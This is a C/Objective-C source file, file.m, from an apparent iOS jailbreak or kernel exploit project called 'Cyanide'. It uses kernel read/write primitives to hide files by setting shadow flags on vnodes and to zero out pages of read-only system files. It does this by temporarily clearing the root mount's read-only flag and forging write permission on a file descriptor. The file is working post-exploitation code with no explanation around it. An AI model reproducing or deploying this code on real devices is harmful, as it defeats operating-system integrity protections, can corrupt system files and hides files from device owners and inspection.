//
//  file.m
//  Cyanide
//
//  Created by seo on 3/29/26.
//

#include "file.h"
#include "krw.h"
#include "offsets.h"
#include "vnode.h"
#include "kutils.h"
#include "xpaci.h"
#import "../kexploit/kexploit_opa334.h"

#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mman.h>

static bool buffer_is_all_zero(const unsigned char *buf, size_t len) {
    if (!buf) return false;
    for (size_t i = 0; i < len; i++) {
        if (buf[i] != 0) return false;
    }
    return true;
}

uint64_t hide_path(const char* path) {
    uint64_t vnode = get_vnode_for_path_by_open(path);
    if(vnode == -1) {
        printf("[%s:%d] Unable to get vnode, path: %s", __FUNCTION__, __LINE__, path);
        return -1;
    }
    
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(vnode + off_vnode_v_usecount);
    uint32_t iocount = kread32(vnode + off_vnode_v_iocount);
    kwrite32(vnode + off_vnode_v_usecount, usecount + 1);
    kwrite32(vnode + off_vnode_v_iocount, iocount + 1);
    
    //hide file
    uint32_t v_flags = kread32(vnode + off_vnode_v_flag);
    kwrite32(vnode + off_vnode_v_flag, (v_flags | VISSHADOW));
    
    //restore vnode iocount, usecount
    usecount = kread32(vnode + off_vnode_v_usecount);
    iocount = kread32(vnode + off_vnode_v_iocount);
    if(usecount > 0)
        kwrite32(vnode + off_vnode_v_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(vnode + off_vnode_v_iocount, iocount - 1);

    return vnode;
}

uint64_t reveal_path_by_vnode(uint64_t vnode) {
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(vnode + off_vnode_v_usecount);
    uint32_t iocount = kread32(vnode + off_vnode_v_iocount);
    kwrite32(vnode + off_vnode_v_usecount, usecount + 1);
    kwrite32(vnode + off_vnode_v_iocount, iocount + 1);
    
    //show file
    uint32_t v_flags = kread32(vnode + off_vnode_v_flag);
    kwrite32(vnode + off_vnode_v_flag, (v_flags &= ~VISSHADOW));
    
    //restore vnode iocount, usecount
    usecount = kread32(vnode + off_vnode_v_usecount);
    iocount = kread32(vnode + off_vnode_v_iocount);
    if(usecount > 0)
        kwrite32(vnode + off_vnode_v_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(vnode + off_vnode_v_iocount, iocount - 1);

    return 0;
}

int zero_system_file_page(const char* path, off_t offset) {
    if (!path || offset < 0) {
        printf("[%s:%d] Invalid path or offset\n", __FUNCTION__, __LINE__);
        return -1;
    }

    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        printf("[%s:%d] open(%s) failed: %s\n",
               __FUNCTION__, __LINE__, path, strerror(errno));
        return -1;
    }

    off_t file_sz = lseek(fd, 0, SEEK_END);
    if (file_sz <= 0 || offset >= file_sz) {
        printf("[%s:%d] Invalid file size/offset for %s: size=%lld offset=%lld\n",
               __FUNCTION__, __LINE__, path, (long long)file_sz, (long long)offset);
        close(fd);
        return -1;
    }

    size_t page_sz = (size_t)getpagesize();
    off_t pageoff = offset & ~((off_t)page_sz - 1);
    size_t zerolen = page_sz;
    if (pageoff + (off_t)zerolen > file_sz) {
        zerolen = (size_t)(file_sz - pageoff);
    }

    uint64_t proc = proc_self();
    uint64_t fileprocPtrArr = kread64(proc + off_proc_p_fd + off_filedesc_fd_ofiles);
    fileprocPtrArr = xpaci(fileprocPtrArr);
    uint64_t fileproc = kread64(fileprocPtrArr + (8 * fd));
    uint64_t fp_glob = kread64(fileproc + off_fileproc_fp_glob);
    fp_glob = xpaci(fp_glob);
    uint64_t vnode = kread64(fp_glob + off_fileglob_fg_data);
    vnode = xpaci(vnode);

    uint64_t rootvnode_mount = kread64(get_rootvnode() + off_vnode_v_mount);
    rootvnode_mount = xpaci(rootvnode_mount);
    uint32_t rootvnode_mnt_flag = kread32(rootvnode_mount + off_mount_mnt_flag);
    uint32_t fg_flag = kread32(fp_glob + off_fileglob_fg_flag);
    uint32_t vnode_writecount = kread32(vnode + off_vnode_v_writecount);
    bool bumped_writecount = ((int32_t)vnode_writecount <= 0);

    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag & ~MNT_RDONLY);
    kwrite32(fp_glob + off_fileglob_fg_flag, fg_flag | FWRITE);
    if (bumped_writecount) {
        kwrite32(vnode + off_vnode_v_writecount, vnode_writecount + 1);
    }

    int rc = -1;
    void* mapped = mmap(NULL, page_sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, pageoff);
    if (mapped == MAP_FAILED) {
        printf("[%s:%d] mmap(%s) failed: %s\n",
               __FUNCTION__, __LINE__, path, strerror(errno));
    } else {
        memset(mapped, 0, zerolen);
        if (msync(mapped, zerolen, MS_SYNC) == -1) {
            printf("[%s:%d] msync(%s) failed: %s\n",
                   __FUNCTION__, __LINE__, path, strerror(errno));
        } else {
            unsigned char *verify = malloc(zerolen);
            if (!verify) {
                printf("[%s:%d] verify malloc(%zu) failed for %s\n",
                       __FUNCTION__, __LINE__, zerolen, path);
            } else {
                ssize_t got = pread(fd, verify, zerolen, pageoff);
                if (got != (ssize_t)zerolen) {
                    printf("[%s:%d] verify pread(%s) got %zd/%zu: %s\n",
                           __FUNCTION__, __LINE__, path, got, zerolen,
                           got < 0 ? strerror(errno) : "short read");
                } else if (!buffer_is_all_zero(verify, zerolen)) {
                    printf("[%s:%d] verify failed: %s page offset %lld is not all zero after write\n",
                           __FUNCTION__, __LINE__, path, (long long)pageoff);
                } else {
                    printf("[ZERO] verified %s page offset %lld is zeroed (%zu bytes)\n",
                           path, (long long)pageoff, zerolen);
                    rc = 0;
                }
                free(verify);
            }
        }
        munmap(mapped, page_sz);
    }

    if (bumped_writecount) {
        kwrite32(vnode + off_vnode_v_writecount, vnode_writecount);
    }
    kwrite32(fp_glob + off_fileglob_fg_flag, fg_flag);
    kwrite32(rootvnode_mount + off_mount_mnt_flag, rootvnode_mnt_flag);

    close(fd);
    return rc;
}
